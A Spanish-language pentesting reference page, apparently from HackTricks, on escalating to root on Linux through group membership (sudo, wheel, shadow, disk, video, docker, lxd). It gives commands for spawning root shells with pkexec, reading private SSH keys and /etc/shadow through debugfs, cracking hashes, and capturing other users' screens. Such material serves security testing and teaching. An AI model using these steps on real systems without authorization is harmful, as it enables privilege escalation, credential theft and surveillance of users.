{{#include ../../banners/hacktricks-training.md}}


# Grupos Sudo/Admin

## **PE - Método 1**

**A veces**, **por defecto \(o porque algún software lo necesita\)** dentro del **/etc/sudoers** archivo puedes encontrar algunas de estas líneas:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Esto significa que **cualquier usuario que pertenezca al grupo sudo o admin puede ejecutar cualquier cosa como sudo**.

Si este es el caso, para **convertirse en root solo puedes ejecutar**:
```text
sudo su
```
## PE - Método 2

Encuentra todos los binarios suid y verifica si hay el binario **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Si encuentras que el binario pkexec es un binario SUID y perteneces a sudo o admin, probablemente podrías ejecutar binarios como sudo usando pkexec.  
Verifica el contenido de:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Ahí encontrarás qué grupos tienen permiso para ejecutar **pkexec** y **por defecto** en algunos linux pueden **aparecer** algunos de los grupos **sudo o admin**.

Para **convertirte en root puedes ejecutar**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Si intentas ejecutar **pkexec** y obtienes este **error**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**No es porque no tengas permisos, sino porque no estás conectado sin una GUI**. Y hay una solución para este problema aquí: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Necesitas **2 sesiones ssh diferentes**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
# Wheel Group

**A veces**, **por defecto** dentro del **/etc/sudoers** archivo puedes encontrar esta línea:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Esto significa que **cualquier usuario que pertenezca al grupo wheel puede ejecutar cualquier cosa como sudo**.

Si este es el caso, para **convertirse en root solo puedes ejecutar**:
```text
sudo su
```
# Grupo Shadow

Los usuarios del **grupo shadow** pueden **leer** el **/etc/shadow** archivo:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Así que, lee el archivo y trata de **crackear algunos hashes**.

# Grupo de Disco

Este privilegio es casi **equivalente al acceso root** ya que puedes acceder a todos los datos dentro de la máquina.

Archivos: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Tenga en cuenta que usando debugfs también puede **escribir archivos**. Por ejemplo, para copiar `/tmp/asd1.txt` a `/tmp/asd2.txt` puede hacer:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Sin embargo, si intentas **escribir archivos propiedad de root** \(como `/etc/shadow` o `/etc/passwd`\) recibirás un error de "**Permiso denegado**".

# Video Group

Usando el comando `w` puedes encontrar **quién está conectado al sistema** y mostrará una salida como la siguiente:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
El **tty1** significa que el usuario **yossi está conectado físicamente** a un terminal en la máquina.

El **grupo de video** tiene acceso para ver la salida de la pantalla. Básicamente, puedes observar las pantallas. Para hacer eso, necesitas **capturar la imagen actual en la pantalla** en datos en bruto y obtener la resolución que está utilizando la pantalla. Los datos de la pantalla se pueden guardar en `/dev/fb0` y podrías encontrar la resolución de esta pantalla en `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Para **abrir** la **imagen en bruto** puedes usar **GIMP**, seleccionar el archivo **`screen.raw`** y seleccionar como tipo de archivo **Datos de imagen en bruto**:

![](../../images/image%20%28208%29.png)

Luego modifica el Ancho y la Altura a los que se usaron en la pantalla y verifica diferentes Tipos de Imagen \(y selecciona el que muestre mejor la pantalla\):

![](../../images/image%20%28295%29.png)

# Grupo Root

Parece que por defecto **los miembros del grupo root** podrían tener acceso a **modificar** algunos archivos de configuración de **servicios** o algunos archivos de **bibliotecas** o **otras cosas interesantes** que podrían ser utilizadas para escalar privilegios...

**Verifica qué archivos pueden modificar los miembros de root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Grupo Docker

Puedes montar el sistema de archivos raíz de la máquina host en el volumen de una instancia, de modo que cuando la instancia se inicie, carga inmediatamente un `chroot` en ese volumen. Esto te da efectivamente acceso root en la máquina.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# Grupo lxc/lxd

[lxc - Escalación de Privilegios](lxd-privilege-escalation.md)

{{#include ../../banners/hacktricks-training.md}}
